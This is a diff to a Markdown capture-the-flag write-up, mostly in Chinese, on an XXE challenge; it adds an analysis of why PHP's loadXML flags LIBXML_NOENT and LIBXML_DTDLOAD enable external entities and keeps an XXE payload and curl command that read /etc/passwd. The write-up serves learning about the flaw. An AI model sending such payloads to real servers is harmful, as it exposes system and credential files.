@@ -12,6 +12,7 @@ date: 2023-02-09
 Challenge: http://h4ck3r.quest:8604/
 
 ## Background
+* [Terminology Security Related]({{base.url}}/Security-Related)
 * [XML Tree](https://www.w3schools.com/xml/xml_tree.asp)
 * [XML Parser](https://www.w3schools.com/xml/xml_parser.asp)
 * [AJAX - Server Response](https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp)
@@ -53,19 +54,35 @@ Challenge: http://h4ck3r.quest:8604/
 ?>
 ```
 
+## Analyze
+此php會讀request body，並且以xml的格式讀取，最重要的就是怎麼讀取
+```php
+$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+```
+這兩個flag非常危險
+
+| Flag           | 意義                     | 風險              |
+| -------------- | ---------------------- | --------------- |
+| LIBXML_NOENT   | 解析實體（entity expansion） | 會展開 `<!ENTITY>` |
+| LIBXML_DTDLOAD | 允許載入外部 DTD             | 可讀取外部檔案         |
+
+這直接開啟 XXE（XML External Entity），如果這邊的邏輯允許XXE，那麼我們就可以寫一個payload傳進去讀取機敏資料
+
 ## Exploit - XXE
 Normal Usage in this webpage → 修改封包
 * Payload
-```xml
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE ANY [
-<!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<test>
-<user>&xxe;</user>
-</test>
-```
+    ```xml
+    <?xml version="1.0" encoding="utf-8"?>
+    <!DOCTYPE ANY [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <test>
+    <user>&xxe;</user>
+    </test>
+    ```
+
 or
+
 ```bash
 $ curl -X POST http://localhost:8000 \
 -d '<?xml version="1.0"?>
@@ -76,6 +93,7 @@ $ curl -X POST http://localhost:8000 \
 <user>&xxe;</user>
 </test>'
 ```
+
 ## 如果要Deploy on localhost
 1. 安裝`php-xml`
     ```bash
